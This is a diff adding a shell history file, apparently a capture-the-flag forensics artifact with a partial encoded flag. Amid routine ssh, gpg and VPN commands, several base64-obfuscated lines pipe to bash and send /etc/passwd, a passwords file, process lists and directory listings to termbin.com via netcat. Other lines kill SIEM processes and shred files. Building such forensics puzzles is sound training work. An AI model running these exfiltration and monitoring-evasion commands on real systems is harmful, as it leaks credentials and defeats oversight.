@@ -1,0 +1,218 @@
+ssh ideh@ideh-1
+totp-gen ideh1
+ssh ideh@ideh-2
+eog ideh.png
+ps ax | grep eog
+kill 622
+eog &
+exit
+ping 192.168.1.31
+ping 192.168.1.32
+totp-gen ideh1
+totp-gen ideh2
+totp-gen google
+totp-gen google
+apropos
+apropos pdf
+man pdfdetach
+pdfdetach -list ideh.pdf 
+man pdfimages
+pdfimages -f 153 -l 174 -png ideh.pdf 1
+totp-gen ideh1
+totp-gen ideh2
+ssh ideh@ideh-1
+ssh ideh@ideh-2
+curl https://keys.ideh0/g.asc > g.asc
+gpg --import g.asc 
+gpg --verify s.txt 
+gpg --list-keys
+ps ax | grep siem
+kill 28656 28659 28684
+df -h
+exit
+cd ~/ideh/production-data/
+sudo freshclam
+clamscan -r
+dig production.ideh-5
+dig @9.9.9.9 production.ideh-5
+dig @9.9.9.9 production.ideh-5 A
+vpn -c ideh-5 -u ideh
+ua
+vpn -c ideh-5 -u ideh
+apropos record
+ykman list
+ykman oath code -d 66666666
+ykman -d 66666666 oath code
+gpg --list-secret-keys
+history | grep armor
+gpg --armor --export C45221 > ideh-7-sign.asc
+cp ideh-7-sign.asc /run/media/ideh/backup_ssd/keys/ideh-7-sign.asc
+ls
+cd ..
+ls
+cat ideh-7-sign.asc
+rm ideh-7-sign.asc
+exit
+ps ax | grep siem
+kill 422
+ssh ideh@ideh-1
+totp-gen ideh1
+totp-gen ideh1
+totp-gen ideh2
+totp-gen ideh2
+vpn -c ideh-5 -u ideh
+ssh ideh@ideh-2
+totp-gen ideh2
+ssh ideh@ideh-2
+totp-gen ideh2
+totp-gen google
+exit
+totp-gen ideh2
+ssh ideh@ideh-2
+chromeswitch off
+ls
+cd ..
+echo aWRlaDEK | base64 -d
+gpg --list-secret-keys
+gpg --export --armor IB85C221> cit-1-enc.asc
+cp cit-1-enc.asc /run/media/ideh/backup_ssd/keys/cit-1-enc.asc
+echo cHMgYXggPiBwcm9jZXNzZXM= | base64 -d | bash
+. ./gpg-rm-expired-keys.sh 
+sudo pacman -S archlinux-keyring
+gpg --import signedPubKey.asc 
+gpg --import pubring.gpg 
+gpg --list-keys
+gpg --secret-list-keys
+gpg --list-secret-keys
+curl https://files.ideh-1/arabanimajneb.asc --insecure
+echo Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDEzMzcK | base64 -d | bash
+sftp ideh@files.ideh-1
+nano azertyuiop.md
+ls
+cd ../prod/
+sftp ideh@files.ideh-1
+sftp ideh@files.ideh-1
+exit
+totp-gen ideh2
+totp-gen ideh2
+totp-gen ideh2
+vpn -c ideh-5 -u ideh
+ssh ideh@ideh-2
+ssh ideh@ideh-2
+sudo paccache -r
+. ./push.sh 
+. ./push.sh 
+ls
+cd ..
+ls
+. ./push.sh 
+exit
+nano business-card.tex
+echo cm0gcHJvY2Vzc2Vz | base64 -d | bash
+sudo xbacklight -set 10
+kill 422
+echo bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg== | base64 -d | bash
+vpn -c ideh-5 -u ideh
+totp-gen ideh1
+totp-gen google
+totp-gen google
+nano meeting.txt
+nano files.txt
+exit
+vpn -c ideh-5 -u ideh
+ssh ideh@ideh-3
+ssh ideh@ideh-1
+ssh ideh@ideh-2
+totp-gen ideh1
+totp-gen ideh2
+totp-gen ideh2
+vpn -c ideh-8 -u ideh
+echo kwYURONVgzTjBNR3d6WDIxNVgyUTBkRFI5Q2c9PQo=
+nano README.md
+exit
+sftp ideh@files.ideh-1
+cat ~/.ssh/known_hosts 
+ssh-keygen -R files.ideh-1
+cat ~/.ssh/known_hosts 
+echo ZWNobyBhV1JsYUh0MGFEQnpNMTlpTkRWME0zSmtOVj
+mogrify -strip 2021-02-28-slideset-ideh.jpg 
+shred 2021-02-28-slideset-ideh-full.pdf
+ls
+shred 123456.jpg 
+compiler unlock
+compiler lock
+sudo paccache -r
+totp-gen ideh1
+totp-gen ideh2
+totp-gen google
+ssh ideh@ideh-1
+ssh ideh@ideh-2
+lscpu 
+hwinfo --short
+hwinfo --bios
+exit
+ssh ideh@ideh-3
+totp-gen google
+ssh ideh@ideh-3
+ssh ideh@ideh-3
+totp-gen google
+totp-gen ms
+echo Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gMTMzNwo= | base64 -d | bash
+ping 192.168.1.15
+totp-gen ms
+totp-gen google
+totp-gen google
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "1"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "2"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "3"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "4"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "5"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "6"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "7"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "8"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "9"
+. ./download.sh "ideh-3" "26" "backup_ideh_01_02_2021" "1"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "010"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "1" "4"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "1" "5"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "1" "6"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "1" "7"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "1" "8"
+. ./download.sh "ideh-3" "26" "backlog_ideh_02_2021" "2" "1"
+. ./download.sh "ideh-3" "7" "backup_ideh_02_2021" "011"
+totp-gen google
+totp-gen google
+ps ax | grep ideh
+kill 2387 2390 2392 2423 2643 2675
+ps ax | grep ctf
+kill 3490
+totp-gen ideh1
+totp-gen ideh2
+ssh ideh@ideh-2
+ssh ideh@ideh-1
+sudo freshclam
+clamscan
+totp-gen ideh1
+totp-gen ideh1
+whois 192.168.1.174
+ssh ideh@ideh-1
+echo Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSAxMzM3Cg== | base64 -d | bash
+zip -e -r bb.zip 7.bz2 
+man zip
+exit
+totp-gen google
+ssh ideh@ideh-3
+ssh ideh@ideh-2
+mkdir -p ~/prod/ideh/2/temp/
+mv *.bak ~/prod/ideh/2/temp/
+totp-gen ideh1
+totp-gen ideh2
+ssh ideh@ideh-1
+cat .git/config 
+ssh ideh@ideh-3
+totp-gen google
+ssh ideh@ideh-1
+totp-gen ideh1
+totp-gen ideh2
+ssh ideh@ideh-2
+exit
